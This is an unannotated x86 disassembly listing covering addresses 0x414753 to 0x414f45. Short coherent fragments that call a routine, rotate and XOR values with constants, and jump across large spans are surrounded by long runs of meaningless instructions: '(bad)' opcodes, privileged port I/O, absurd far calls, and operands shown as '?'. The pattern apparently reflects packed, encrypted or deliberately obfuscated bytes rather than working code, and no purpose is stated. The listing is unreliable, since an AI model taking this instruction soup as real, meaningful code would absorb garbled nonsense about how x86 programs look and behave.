  414753:	mov    DWORD PTR [ebp-0x80],ecx
  414756:	lea    eax,[ebp-0x80]
  414759:	push   eax
  41475a:	mov    eax,DWORD PTR [ebp+0x10]
  41475d:	mov    ecx,DWORD PTR [ebp+0x14]
  414760:	shrd   eax,ecx,0x2
  414764:	shr    ecx,0x2
  414767:	mov    ecx,DWORD PTR [ebp+0x10]
  41476a:	mov    edx,DWORD PTR [ebp+0x14]
  41476d:	xor    eax,esi
  41476f:	xor    edx,edx
  414771:	or     eax,edx
  414773:	push   eax
  414774:	mov    eax,ds:0x422738
  414779:	mov    edi,0x42267e
  41477e:	push   edi
  41477f:	push   DWORD PTR [eax]
  414781:	shl    ecx,0x1e
  414784:	call   0x41b447
  414789:	lea    eax,[ebp-0x80]
  41478c:	push   eax
  41478d:	mov    eax,DWORD PTR [ebp+0x10]
  414790:	jmp    0x414ac9
  414795:	pop    ds
  414796:	cmp    eax,0xaf9fd01d
  41479b:	das    
  41479c:	lods   eax,DWORD PTR ds:[esi]
  41479d:	sbb    DWORD PTR [esi+0x7500a4c7],edi
  4147a3:	int    0x90
  4147a5:	stos   DWORD PTR es:[edi],eax
  4147a6:	sahf   
  4147a7:	mov    esi,0xbec4edbe
  4147ac:	mov    esi,0xc40b980f
  4147b1:	mov    bl,0x86
  4147b3:	(bad)  
  4147b4:	fldcw  WORD PTR [ebx-0xe627ce5]
  4147ba:	mov    WORD PTR [esi+0x48],ss
  4147bd:	mov    gs,WORD PTR [edx+eiz*8+0x18]
  4147c1:	popf   
  4147c2:	adc    al,0x49
  4147c4:	xchg   esi,eax
  4147c5:	and    DWORD PTR [ebx-0x66],esp
  4147c8:	mov    BYTE PTR [ebx+edi*4-0x364caa95],bh
  4147cf:	pop    eax
  4147d0:	mov    esi,0xa8d072e2
  4147d5:	inc    esp
  4147d6:	jl     0x41475d
  4147d8:	fistp  QWORD PTR [edi]
  4147da:	pop    ebx
  4147db:	and    esi,DWORD PTR [eax-0x5c347457]
  4147e1:	cmc    
  4147e2:	and    eax,0xffd201ac
  4147e7:	mov    eax,ds:0x3a0dbdd8
  4147ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147ed:	(bad)  
  4147ef:	cmp    al,0xa2
  4147f1:	mov    ch,ah
  4147f3:	mov    cs,ebp
  4147f5:	std    
  4147f6:	ret    
  4147f7:	xchg   edx,eax
  4147f8:	push   edx
  4147f9:	fwait
  4147fa:	xchg   esp,eax
  4147fb:	scas   al,BYTE PTR es:[edi]
  4147fc:	loopne 0x414868
  4147fe:	mov    ebp,0x228e2332
  414803:	out    dx,eax
  414804:	mov    ch,BYTE PTR [edx+0x5a]
  414807:	push   esp
  414808:	outs   dx,DWORD PTR ds:[esi]
  414809:	fdiv   QWORD PTR [eax+0x15]
  41480c:	loope  0x41480a
  41480e:	lods   eax,DWORD PTR ds:[esi]
  41480f:	xchg   DWORD PTR [ecx-0x6d],eax
  414812:	sub    al,ch
  414814:	shl    BYTE PTR [ecx+0x10efdcb3],1
  41481a:	js     0x4147e7
  41481c:	lods   eax,DWORD PTR ds:[esi]
  41481d:	std    
  41481e:	and    dh,al
  414820:	mov    al,0x88
  414822:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414823:	dec    eax
  414824:	xchg   ecx,eax
  414825:	sbb    eax,0xa7f1a168
  41482a:	lods   eax,DWORD PTR ds:[esi]
  41482b:	mov    ah,dh
  41482d:	fs test eax,0x243ec438
  414833:	pop    edi
  414834:	es fwait
  414836:	repz fs lahf 
  414839:	call   0xbe65:0x7850921c
  414840:	mov    bl,0xfe
  414842:	jnp    0x41487c
  414844:	cmp    al,0x7b
  414846:	or     eax,0x3cc920d0
  41484b:	(bad)
  41484e:	push   ebp
  41484f:	sub    BYTE PTR [ecx],cl
  414851:	aaa    
  414852:	push   cs
  414853:	sub    BYTE PTR [ebp-0x5c838407],ch
  414859:	xchg   DWORD PTR [edx],edi
  41485b:	cwde   
  41485c:	fidiv  WORD PTR [ebp-0x58b5ee97]
  414862:	retf   0x35f5
  414865:	fmul   DWORD PTR [ecx-0x269439cc]
  41486b:	fs shr edx,1
  41486e:	repz and al,0x14
  414871:	aam    0x9e
  414873:	call   0x5e3b:0x9fbacb3a
  41487a:	cmp    ecx,DWORD PTR [ebx]
  41487c:	dec    ebx
  41487d:	call   0x98b0:0xab3e543d
  414884:	sbb    BYTE PTR [ebp+0x31aeeef5],dh
  41488a:	shl    BYTE PTR [edi],cl
  41488c:	pop    ebx
  41488d:	test   DWORD PTR [ebx-0x64e95759],0x9bd4f7c7
  414897:	xchg   esp,eax
  414898:	mov    eax,ds:0x39208dee
  41489d:	das    
  41489e:	and    cl,BYTE PTR [edx+0x56]
  4148a1:	sub    eax,0xbad77361
  4148a6:	mov    esi,0x15cf992b
  4148ab:	daa    
  4148ac:	add    ecx,DWORD PTR [ecx-0x76]
  4148af:	cwde   
  4148b0:	push   ss
  4148b1:	adc    BYTE PTR [edx-0x54],ah
  4148b4:	push   esi
  4148b5:	mov    edi,ds
  4148b7:	pusha  
  4148b8:	in     eax,dx
  4148b9:	and    DWORD PTR [edi-0x1d],edx
  4148bc:	push   0xcedab73f
  4148c1:	cdq    
  4148c2:	cs dec esp
  4148c4:	lock adc al,0x87
  4148c7:	(bad)  
  4148c8:	in     eax,0x41
  4148ca:	nop
  4148cb:	add    BYTE PTR [edi+0x2a],0xca
  4148cf:	dec    ecx
  4148d0:	neg    BYTE PTR [ecx+edi*4+0x74]
  4148d4:	jbe    0x414955
  4148d6:	fisubr WORD PTR [edx+0x6f]
  4148d9:	fwait
  4148da:	xchg   esi,eax
  4148db:	dec    esp
  4148dc:	fnstcw WORD PTR gs:[edx-0x3de566e3]
  4148e3:	ficomp WORD PTR [esi+0x6cac69f9]
  4148e9:	call   0x2350:0x88c03caf
  4148f0:	sub    al,0xe2
  4148f2:	das    
  4148f3:	cld    
  4148f4:	jecxz  0x414958
  4148f6:	adc    eax,0x3d6985ee
  4148fb:	outs   dx,BYTE PTR ds:[esi]
  4148fc:	xlat   BYTE PTR ds:[ebx]
  4148fd:	sbb    al,0x69
  4148ff:	mov    BYTE PTR [esi],dh
  414901:	jmp    0x1783e8e0
  414906:	push   esi
  414907:	pop    ecx
  414908:	inc    edx
  414909:	cmp    bh,dl
  41490b:	in     al,dx
  41490c:	jge    0x41496e
  41490e:	mov    ecx,DWORD PTR [ebp-0x5c]
  414911:	jno    0x414924
  414913:	arpl   bp,ax
  414915:	mov    eax,ds:0x98ed9c54
  41491a:	leave  
  41491b:	jmp    0xed6566c3
  414920:	imul   BYTE PTR [esi]
  414922:	add    al,0x0
  414924:	mov    cl,ah
  414926:	shl    DWORD PTR [edi+0x5dec965a],cl
  41492c:	aas    
  41492d:	dec    ebp
  41492e:	mov    edx,0x9f7af309
  414933:	mov    bl,0x82
  414935:	sub    bl,BYTE PTR [edi+0x7090b85]
  41493b:	sub    eax,ecx
  41493d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41493e:	or     eax,0x79006124
  414943:	pop    ebx
  414944:	mov    esp,DWORD PTR [ebp-0xb]
  414947:	mov    edx,0x44075a4b
  41494c:	shl    DWORD PTR [ebx],0xd1
  41494f:	mov    BYTE PTR [ebp+0x2587564b],0xd5
  414956:	mov    ebx,0xd0f76d1c
  41495b:	cmovns esp,eax
  41495e:	xchg   bl,dh
  414960:	jns    0x41495f
  414962:	adc    ah,bl
  414964:	push   0x0
  414966:	mov    dh,0x58
  414968:	jo     0x414910
  41496a:	rcl    DWORD PTR ds:0x25e7e8aa,0x9d
  414971:	mov    dl,0x7f
  414973:	mov    esi,0x2f1ecfc0
  414978:	mov    eax,ds:0x4ee19235
  41497d:	gs or  esp,ebx
  414980:	xor    al,0xea
  414982:	jg     0x260a542e
  414988:	mov    ds,esp
  41498a:	dec    eax
  41498b:	call   0x91951114
  414990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414991:	std    
  414992:	jno    0x414934
  414994:	jle    0x414958
  414996:	arpl   di,sp
  414998:	leave  
  414999:	inc    ebp
  41499a:	sahf   
  41499b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41499c:	and    cl,BYTE PTR [esi-0x6bc45c4d]
  4149a2:	jecxz  0x4149b9
  4149a4:	std    
  4149a5:	ss shl sp,1
  4149a9:	in     eax,0x30
  4149ab:	lods   eax,DWORD PTR ds:[esi]
  4149ac:	adc    eax,0xd132c4b3
  4149b1:	lahf   
  4149b2:	out    0x41,al
  4149b4:	out    0x80,eax
  4149b6:	scas   eax,DWORD PTR es:[edi]
  4149b7:	jns    0x41496d
  4149b9:	cmp    ebx,eax
  4149bb:	adc    al,0x5f
  4149bd:	jnp    0x4149ff
  4149bf:	stc    
  4149c0:	xor    edx,esp
  4149c2:	sub    ch,BYTE PTR [edx]
  4149c4:	and    eax,0xd76d0734
  4149c9:	cmp    ah,BYTE PTR [edx]
  4149cb:	jbe    0x414986
  4149cd:	sub    al,BYTE PTR [edi+eiz*1-0x634c531a]
  4149d4:	and    al,0xcf
  4149d6:	gs xchg edi,eax
  4149d8:	cwde   
  4149d9:	aas    
  4149da:	add    DWORD PTR [ecx],ecx
  4149dc:	mov    ds:0x379d4d1,al
  4149e1:	add    eax,0x4d1b658
  4149e6:	xchg   esi,eax
  4149e7:	gs mov edi,0x61d12d8e
  4149ed:	cmp    DWORD PTR [esp+ebx*4],0xcb699ba3
  4149f4:	je     0x414a74
  4149f6:	xor    al,0x3b
  4149f8:	sbb    al,0xd8
  4149fa:	lods   eax,DWORD PTR ds:[esi]
  4149fb:	lds    edi,FWORD PTR ds:0xa22eeedf
  414a01:	sar    DWORD PTR [ebx+0x1b],1
  414a04:	daa    
  414a05:	out    dx,al
  414a06:	dec    edi
  414a07:	push   0x7d42fce7
  414a0c:	mov    WORD PTR [esi+esi*4-0xc],?
  414a10:	mov    dh,0x85
  414a12:	xor    dh,ch
  414a14:	stos   BYTE PTR es:[edi],al
  414a15:	add    eax,0xd9931969
  414a1a:	(bad)  
  414a1b:	ss je  0x414a3d
  414a1e:	test   al,0x1a
  414a20:	clc    
  414a21:	jns    0x414a64
  414a23:	cs jnp 0x414a2a
  414a26:	(bad)  
  414a27:	mov    ds:0x29da1cc3,al
  414a2c:	jge    0x4149b1
  414a2e:	cmp    dl,ch
  414a30:	lods   eax,DWORD PTR ds:[esi]
  414a31:	std    
  414a32:	sbb    eax,0xc3756654
  414a37:	mov    ecx,DWORD PTR [ebx-0x3]
  414a3a:	mov    esp,0xbbb2630c
  414a3f:	popa   
  414a40:	push   edi
  414a41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a42:	pop    edi
  414a43:	push   ds
  414a44:	mov    cl,0x97
  414a46:	xlat   BYTE PTR ds:[ebx]
  414a47:	or     edx,DWORD PTR [esi-0x56c7ff1d]
  414a4d:	xor    esp,ebp
  414a4f:	xlat   BYTE PTR ds:[ebx]
  414a50:	mov    al,0x6e
  414a52:	inc    esp
  414a53:	cmc    
  414a54:	inc    ebx
  414a55:	in     al,dx
  414a56:	sbb    edi,0xffffffb4
  414a59:	out    0x96,eax
  414a5b:	mov    al,ds:0x8765070f
  414a60:	pushf  
  414a61:	mov    ax,WORD PTR ds:0x2564551b
  414a68:	inc    ebp
  414a69:	sti    
  414a6a:	out    dx,al
  414a6b:	nop
  414a6c:	mov    ds:0x8b306871,eax
  414a71:	push   esi
  414a72:	mov    cl,0xee
  414a74:	cmp    BYTE PTR [eax-0x44650e88],bl
  414a7a:	pop    es
  414a7b:	aas    
  414a7c:	mov    ah,0x3
  414a7e:	scas   eax,DWORD PTR es:[edi]
  414a7f:	les    esp,FWORD PTR [edi-0x2592bdc5]
  414a85:	cmp    edi,eax
  414a87:	adc    dl,BYTE PTR [ebx]
  414a89:	xor    DWORD PTR [eax],esi
  414a8b:	fimul  DWORD PTR [ebx]
  414a8d:	test   BYTE PTR fs:[edx*4-0x7ed48a43],al
  414a95:	adc    BYTE PTR [esi],dl
  414a97:	mov    ds:0xe70959c2,eax
  414a9c:	aad    0x11
  414a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a9f:	xchg   edi,eax
  414aa0:	cmp    BYTE PTR [ebx],ah
  414aa2:	cmp    eax,DWORD PTR ds:0x4ce1a328
  414aa8:	ficom  WORD PTR [esi-0x71]
  414aab:	call   0x8daf:0x6984e227
  414ab2:	cmp    al,0xad
  414ab4:	or     DWORD PTR [edi],ecx
  414ab6:	and    al,0xb6
  414ab8:	in     al,dx
  414ab9:	dec    esp
  414aba:	sub    dl,bl
  414abc:	adc    DWORD PTR [edx+ecx*8-0x41],ecx
  414ac0:	jecxz  0x414b32
  414ac2:	xchg   edi,eax
  414ac3:	adc    ah,BYTE PTR [edx+ebx*2]
  414ac6:	ins    DWORD PTR es:[edi],dx
  414ac7:	xchg   edx,eax
  414ac8:	mov    ebx,0xf144d8b
  414acd:	lods   al,BYTE PTR ds:[esi]
  414ace:	enter  0xc102,0xe9
  414ad2:	add    cl,BYTE PTR [ebx+0x558b104d]
  414ad8:	adc    al,0x33
  414ada:	(bad)  
  414adb:	xor    edx,edx
  414add:	or     eax,edx
  414adf:	push   eax
  414ae0:	mov    eax,ds:0x422738
  414ae5:	push   edi
  414ae6:	push   DWORD PTR [eax]
  414ae8:	shl    ecx,0x1e
  414aeb:	call   0x41b447
  414af0:	mov    eax,DWORD PTR [ebp-0x3c]
  414af3:	mov    eax,DWORD PTR [ebp-0x2c]
  414af6:	mov    edi,DWORD PTR [ebp-0x24]
  414af9:	mov    eax,DWORD PTR [ebp-0x30]
  414afc:	mov    ecx,edi
  414afe:	mov    DWORD PTR [ebp-0x1c],eax
  414b01:	rol    ecx,0x2
  414b04:	mov    eax,0xa5069bae
  414b09:	xor    ecx,eax
  414b0b:	jmp    0x414e44
  414b10:	fisttp WORD PTR [eax+0x5aac5a8c]
  414b16:	xor    BYTE PTR [esp+edx*1+0x109e14bc],bh
  414b1d:	in     al,0x44
  414b1f:	fstp   st(3)
  414b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b22:	mov    esi,0xbec4edbe
  414b27:	mov    esi,0x8ad260ce
  414b2c:	and    edi,DWORD PTR [esi-0x6506535d]
  414b32:	in     al,0xc7
  414b34:	mov    ?,WORD PTR [esp+eax*2-0x22]
  414b38:	jle    0x414ac5
  414b3a:	cmp    DWORD PTR [edx],esi
  414b3c:	pop    es
  414b3d:	out    dx,eax
  414b3e:	lds    edx,FWORD PTR [ecx+edx*4-0x4969c629]
  414b45:	stc    
  414b46:	out    0x20,al
  414b48:	mov    ah,0xcb
  414b4a:	test   ah,al
  414b4c:	rcr    dl,0xec
  414b4f:	xchg   ecx,eax
  414b50:	ret    
  414b51:	dec    ecx
  414b52:	in     eax,0x1a
  414b54:	xor    dh,BYTE PTR [ebx-0x209e7d4a]
  414b5a:	mov    bh,0x9
  414b5c:	ror    DWORD PTR [ebp+eiz*1-0x512ddffe],0x16
  414b64:	push   edx
  414b65:	cmp    ah,BYTE PTR [edi]
  414b67:	or     ebp,DWORD PTR [eax-0x73]
  414b6a:	pop    eax
  414b6b:	clc    
  414b6c:	fsubr  DWORD PTR [edx-0x441264cd]
  414b72:	jo     0x414bb5
  414b74:	mov    edx,0xf67040ec
  414b79:	inc    ebx
  414b7a:	enter  0x869a,0xa4
  414b7e:	cmp    ch,BYTE PTR [edx-0x17]
  414b81:	xchg   bp,ax
  414b83:	xchg   DWORD PTR [ebp-0x79046389],esp
  414b89:	test   ch,bl
  414b8b:	out    dx,eax
  414b8c:	mov    BYTE PTR [ecx-0x6dee7475],cl
  414b92:	cmc    
  414b93:	mov    WORD PTR [ebx+0x2a01de0b],cs
  414b99:	adc    DWORD PTR [eax],ebp
  414b9b:	shl    DWORD PTR [edi-0x5e21205a],cl
  414ba1:	or     BYTE PTR [esi],0x8e
  414ba4:	sahf   
  414ba5:	and    ah,BYTE PTR [edx+0x31]
  414ba8:	pop    ds
  414ba9:	jns    0x414b68
  414bab:	mov    bl,ah
  414bad:	bound  ebx,QWORD PTR [ecx]
  414baf:	test   DWORD PTR [edi-0x2c87921c],esp
  414bb5:	cmp    esp,DWORD PTR [edi+0x45]
  414bb8:	in     al,0xa6
  414bba:	push   edx
  414bbb:	cmp    eax,0xd2c5c481
  414bc0:	cwde   
  414bc1:	mov    es,WORD PTR [eax]
  414bc3:	xchg   al,dh
  414bc5:	cmp    edi,DWORD PTR [ebp+0x564c4477]
  414bcb:	inc    eax
  414bcc:	(bad)  
  414bcd:	lods   al,BYTE PTR ds:[esi]
  414bce:	pop    eax
  414bcf:	mov    WORD PTR [edi],cs
  414bd1:	adc    bl,BYTE PTR [edi+0x1f6e70df]
  414bd7:	pop    esp
  414bd8:	dec    ebp
  414bd9:	and    eax,0x37542591
  414bde:	test   eax,0x95f57413
  414be3:	out    dx,al
  414be4:	dec    edi
  414be5:	out    0x35,eax
  414be7:	mov    eax,ds:0x2ac28cc5
  414bec:	aam    0xd5
  414bee:	fs jge 0xe1f09c3d
  414bf5:	imul   edi,DWORD PTR [ecx],0x1b
  414bf8:	pop    ebp
  414bf9:	lea    esp,[edi]
  414bfb:	push   ebx
  414bfc:	lds    eax,FWORD PTR [edi-0x4be0213f]
  414c02:	pop    esp
  414c03:	dec    ebx
  414c04:	push   esp
  414c05:	fild   QWORD PTR [ebx+0x23dc2e8d]
  414c0b:	adc    eax,DWORD PTR [edx-0x53]
  414c0e:	inc    ebp
  414c0f:	cli    
  414c10:	or     bl,BYTE PTR [ebp-0x7d8b2422]
  414c16:	test   eax,0x9508d483
  414c1b:	clc    
  414c1c:	ins    DWORD PTR es:[edi],dx
  414c1d:	jne    0x414bda
  414c1f:	ja     0x414bc6
  414c21:	shl    BYTE PTR [ebx],0x2c
  414c24:	sub    edi,esp
  414c26:	xchg   ebp,eax
  414c27:	mov    DWORD PTR [ecx+0x185b4113],ebx
  414c2d:	sub    BYTE PTR [ecx+ebp*1-0x6e],bh
  414c31:	jae    0x414c87
  414c33:	jecxz  0x414c6c
  414c35:	dec    eax
  414c36:	jl     0x414ca6
  414c38:	fmul   DWORD PTR [edi-0x11]
  414c3b:	push   ecx
  414c3c:	dec    esp
  414c3d:	inc    ebx
  414c3e:	xchg   ebx,eax
  414c3f:	dec    eax
  414c40:	mov    ss:0xe10d0697,al
  414c46:	dec    ebp
  414c47:	mov    ah,0x20
  414c49:	and    BYTE PTR [esi+0x3922df4e],ch
  414c4f:	arpl   bx,di
  414c51:	xor    BYTE PTR [ebp-0x3bbc6619],cl
  414c57:	mov    ebx,0x87804268
  414c5c:	cmp    BYTE PTR [eax+edi*1+0x68],dh
  414c60:	call   0x583c5a6c
  414c65:	inc    edx
  414c66:	pop    esp
  414c67:	or     eax,0x8bc80b89
  414c6c:	jno    0x414ce1
  414c6e:	xchg   DWORD PTR [eax+0x51],ebx
  414c71:	sub    DWORD PTR [edx+0xf6f0a17],eax
  414c77:	fisttp QWORD PTR [ecx+0x559509a9]
  414c7d:	repz dec edi
  414c7f:	shl    DWORD PTR [edx-0xa81f3f],0x64
  414c86:	jo     0x414c19
  414c88:	lods   al,BYTE PTR ds:[esi]
  414c89:	outs   dx,DWORD PTR ds:[esi]
  414c8a:	push   0xffffffc1
  414c8c:	sub    DWORD PTR [edx+0x652328aa],0x1282002
  414c96:	out    0x2e,al
  414c98:	mov    esp,edx
  414c9a:	inc    ecx
  414c9b:	mov    edi,0xf7c769b6
  414ca0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ca1:	test   al,0x56
  414ca3:	call   0x7f37:0x1243a055
  414caa:	push   esp
  414cab:	outs   dx,DWORD PTR ds:[esi]
  414cac:	ja     0x414d10
  414cae:	ret    
  414caf:	stc    
  414cb0:	jbe    0x414c72
  414cb2:	imul   esi,DWORD PTR [esi],0xffffff92
  414cb5:	data16 adc al,bl
  414cb8:	aam    0x2f
  414cba:	nop
  414cbb:	push   ebx
  414cbc:	dec    edi
  414cbd:	jno    0x414d29
  414cbf:	add    eax,DWORD PTR [ecx]
  414cc1:	lahf   
  414cc2:	into   
  414cc3:	idiv   dh
  414cc5:	jp     0x414d22
  414cc7:	mov    ebx,0xf3bf9791
  414ccc:	push   eax
  414ccd:	cmp    BYTE PTR [ecx+0x4ec658a1],dl
  414cd3:	popa   
  414cd4:	jo     0x414cb8
  414cd6:	mov    ebp,0x180c2807
  414cdb:	or     ah,BYTE PTR [ecx-0x111785e0]
  414ce1:	repz imul esi,ecx,0xffffff96
  414ce5:	or     BYTE PTR [ebx-0x2cccf33],ah
  414ceb:	gs jo  0x414c75
  414cee:	outs   dx,BYTE PTR ds:[esi]
  414cef:	adc    edi,0x4e
  414cf2:	mov    esi,0xd57ab8f8
  414cf7:	push   es
  414cf8:	mov    ah,dh
  414cfa:	push   ebp
  414cfb:	nop
  414cfc:	mov    BYTE PTR [edx],ch
  414cfe:	mov    ch,0x60
  414d00:	(bad)  
  414d01:	mov    BYTE PTR [ebx+0x13],dh
  414d04:	push   ebx
  414d05:	push   esp
  414d06:	mov    edx,0x21ec7e91
  414d0b:	cmc    
  414d0c:	xor    DWORD PTR [edi-0x3b5cb773],ebx
  414d12:	aam    0xf0
  414d14:	mov    dh,BYTE PTR [ebx+edx*1-0x77]
  414d18:	mov    eax,ds:0x824b25e8
  414d1d:	fcmove st,st(4)
  414d1f:	(bad)  
  414d20:	popa   
  414d21:	push   eax
  414d22:	repnz push 0x9ffddd66
  414d28:	pop    esi
  414d29:	mov    dl,0xd4
  414d2b:	inc    edx
  414d2c:	xchg   BYTE PTR [ebx-0x20],al
  414d2f:	xchg   ecx,eax
  414d30:	xchg   esp,eax
  414d31:	lock mov edx,0xb826f26e
  414d37:	pop    edx
  414d38:	mov    dh,0xb8
  414d3a:	push   esi
  414d3b:	adc    BYTE PTR [esp+eiz*2+0x5a3ad630],0xfd
  414d43:	or     eax,0x1005c4b9
  414d48:	repz or ebp,0xd409d7de
  414d4f:	push   0x691c804f
  414d54:	jnp    0x414d4a
  414d56:	les    esp,FWORD PTR [edi+0xa]
  414d59:	loopne 0x414d50
  414d5b:	xor    ecx,DWORD PTR [eax+ebx*2+0x16db998a]
  414d62:	sbb    eax,DWORD PTR [esi]
  414d64:	dec    ecx
  414d65:	mov    esi,ebp
  414d67:	arpl   WORD PTR [edi+0x71],cx
  414d6a:	iret   
  414d6b:	mov    ebx,0x2edae48
  414d70:	ds aaa 
  414d72:	retf   
  414d73:	ins    DWORD PTR es:[edi],dx
  414d74:	inc    ecx
  414d75:	push   ss
  414d76:	and    al,0xb0
  414d78:	mov    esp,0x7f221f51
  414d7d:	xchg   esp,eax
  414d7e:	sub    esp,DWORD PTR [esi+0x29bcb0be]
  414d84:	dec    esi
  414d85:	lods   eax,DWORD PTR ds:[esi]
  414d86:	push   0x26a43e0e
  414d8b:	lods   eax,DWORD PTR ds:[esi]
  414d8c:	cmp    al,0x7e
  414d8e:	mov    bh,0x3d
  414d90:	loopne 0x414d9c
  414d92:	jne    0x414d48
  414d94:	fbld   TBYTE PTR [ebx]
  414d96:	xchg   esi,eax
  414d97:	jmp    DWORD PTR ds:0x664bd8ab
  414d9d:	push   esp
  414d9e:	mov    ecx,0x8ffb8817
  414da3:	inc    eax
  414da4:	test   DWORD PTR [edi+0x15],esi
  414da7:	push   ds
  414da8:	pop    ebp
  414da9:	lea    esi,[edx+ebx*2]
  414dac:	test   DWORD PTR [ebp-0x54],ebx
  414daf:	sbb    BYTE PTR [esi-0x74],dh
  414db2:	pop    esi
  414db3:	cmp    al,0xb9
  414db5:	push   ds
  414db6:	test   esp,ebx
  414db8:	rcl    bl,cl
  414dba:	stos   BYTE PTR es:[edi],al
  414dbb:	ror    DWORD PTR [edi-0x759b0c4b],1
  414dc1:	pop    ds
  414dc2:	sbb    esi,DWORD PTR [edi]
  414dc4:	pusha  
  414dc5:	mov    edx,0x84a6a034
  414dca:	std    
  414dcb:	daa    
  414dcc:	iret   
  414dcd:	mov    dl,0xe
  414dcf:	sbb    eax,0x8759f8e3
  414dd4:	test   eax,0xcf4f3e99
  414dd9:	shr    bh,0x2
  414ddc:	mov    bl,0x71
  414dde:	sbb    eax,0xd173ef1
  414de3:	cmp    bh,BYTE PTR [ecx+ebp*4+0x1a0a7712]
  414dea:	test   al,bh
  414dec:	test   DWORD PTR [esi+0x52],ecx
  414def:	fwait
  414df0:	cwde   
  414df1:	(bad)  
  414df2:	iret   
  414df3:	jns    0x414e51
  414df5:	and    cl,dl
  414df7:	shl    edx,1
  414df9:	and    ah,BYTE PTR [eax+ecx*1]
  414dfc:	or     BYTE PTR ss:[edx+0x3f],al
  414e00:	ss xor eax,0x7784a1b5
  414e06:	sti    
  414e07:	js     0x414e38
  414e09:	out    dx,al
  414e0a:	jp     0x414e31
  414e0c:	jo     0x414dfe
  414e0e:	not    al
  414e10:	clc    
  414e11:	adc    edx,DWORD PTR [ebx+0xe]
  414e14:	push   esp
  414e15:	pop    edi
  414e16:	or     BYTE PTR [ebx-0x29],dh
  414e19:	mov    edi,0xea2c3500
  414e1e:	dec    ebp
  414e1f:	ds adc dh,al
  414e22:	or     al,0x15
  414e24:	pop    edi
  414e25:	xchg   edx,eax
  414e26:	adc    dh,BYTE PTR [ebx+0x58f665d1]
  414e2c:	push   ecx
  414e2d:	mov    dl,0x57
  414e2f:	outs   dx,DWORD PTR ds:[esi]
  414e30:	dec    edi
  414e31:	lock adc DWORD PTR [edi+0x19],edi
  414e35:	cli    
  414e36:	jo     0x414def
  414e38:	cwde   
  414e39:	rol    ebp,cl
  414e3b:	jae    0x414dbe
  414e3d:	popf   
  414e3e:	in     eax,0x62
  414e40:	push   ecx
  414e41:	xor    BYTE PTR [edx+0x12],bh
  414e44:	cmp    ecx,eax
  414e46:	jmp    0x41517f
  414e4b:	call   0xa44dd255
  414e50:	mov    WORD PTR [edi+0x2a],fs
  414e53:	mov    eax,0xc39e22a6
  414e58:	ror    DWORD PTR [esp+eiz*4-0x414155f4],1
  414e5f:	in     eax,dx
  414e60:	les    edi,FWORD PTR [esi-0x11d7ff42]
  414e66:	xchg   ecx,eax
  414e67:	test   al,0xe8
  414e69:	pop    es
  414e6a:	jmp    DWORD PTR [esi-0x1e]
  414e6d:	mov    ds:0xe182bc55,al
  414e72:	mov    ds:0x2990b2b1,al
  414e77:	or     ebx,DWORD PTR [ebx]
  414e79:	jecxz  0x414e8a
  414e7b:	mov    ah,0xd5
  414e7d:	xor    DWORD PTR [ebx],0xcb46cc45
  414e83:	test   al,0x5b
  414e85:	jnp    0x414e9e
  414e87:	js     0x414e6a
  414e89:	inc    edi
  414e8b:	nop
  414e8c:	or     DWORD PTR [eax],0xd9dcd56c
  414e92:	cmp    ebp,DWORD PTR [eax-0x6d]
  414e95:	or     eax,0xf7507297
  414e9a:	mov    ds:0xfad1a840,eax
  414e9f:	cmp    al,0x49
  414ea1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ea2:	mov    ebp,0x80165071
  414ea7:	nop
  414ea8:	js     0x414e59
  414eaa:	jl     0x414ee7
  414eac:	adc    DWORD PTR [ebx],esp
  414eae:	cdq    
  414eaf:	inc    edi
  414eb0:	pop    ss
  414eb1:	outs   dx,DWORD PTR ds:[esi]
  414eb2:	enter  0x1ab0,0x68
  414eb6:	(bad)  
  414eb7:	cld    
  414eb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414eb9:	mov    dl,0x30
  414ebb:	test   ebp,esp
  414ebd:	jmp    0x414e57
  414ebf:	iret   
  414ec0:	fdiv   QWORD PTR [edx]
  414ec2:	mov    cl,0x3d
  414ec4:	outs   dx,BYTE PTR ds:[esi]
  414ec5:	scas   al,BYTE PTR es:[edi]
  414ec6:	(bad)  
  414ec8:	push   edx
  414ec9:	bound  esp,QWORD PTR [ecx]
  414ecb:	leave  
  414ecc:	fstp   QWORD PTR [ebx+0x49ecbd60]
  414ed2:	push   ecx
  414ed3:	popa   
  414ed4:	adc    al,BYTE PTR [eax+0x63]
  414ed7:	dec    edi
  414ed8:	sub    ch,dl
  414eda:	test   eax,0xa6f35af1
  414edf:	je     0x414e70
  414ee1:	push   ss
  414ee2:	in     al,dx
  414ee3:	test   BYTE PTR [eax-0x1a225c66],ah
  414ee9:	pop    eax
  414eea:	sbb    esp,DWORD PTR [edx-0x1c5c9830]
  414ef0:	leave  
  414ef1:	pop    esp
  414ef2:	and    eax,0x20fb2d73
  414ef7:	inc    ecx
  414ef8:	shl    BYTE PTR fs:[esi-0x47],cl
  414efc:	mov    al,0x66
  414efe:	retf   
  414eff:	cmp    edx,ecx
  414f01:	shl    esi,cl
  414f03:	call   0x3e64:0x21f24a5a
  414f0a:	mov    ds:0x9f3136bb,eax
  414f0f:	hlt    
  414f10:	popf   
  414f11:	mov    ebx,DWORD PTR [edx+0x16]
  414f14:	or     ah,bh
  414f16:	sti    
  414f17:	aad    0xcf
  414f19:	jae    0x414ee1
  414f1b:	(bad)  
  414f1c:	mov    al,0xe0
  414f1e:	adc    dh,ch
  414f20:	jb     0x414edf
  414f22:	cdq    
  414f23:	ret    0xe11d
  414f26:	cmp    al,0x59
  414f28:	jge    0x414ef6
  414f2a:	cmc    
  414f2b:	pop    edx
  414f2c:	cld    
  414f2d:	pushf  
  414f2e:	add    DWORD PTR [esi+0x7b],ebx
  414f31:	push   ss
  414f32:	add    ecx,ecx
  414f34:	sbb    ebx,DWORD PTR [edx+ebx*2]
  414f37:	pop    ds
  414f38:	add    al,0xbb
  414f3a:	repnz mov ebx,0x6ceaf09c
  414f40:	adc    al,0xba
  414f42:	in     eax,0xf8
  414f44:	push   ecx
  414f45:	out    dx,eax
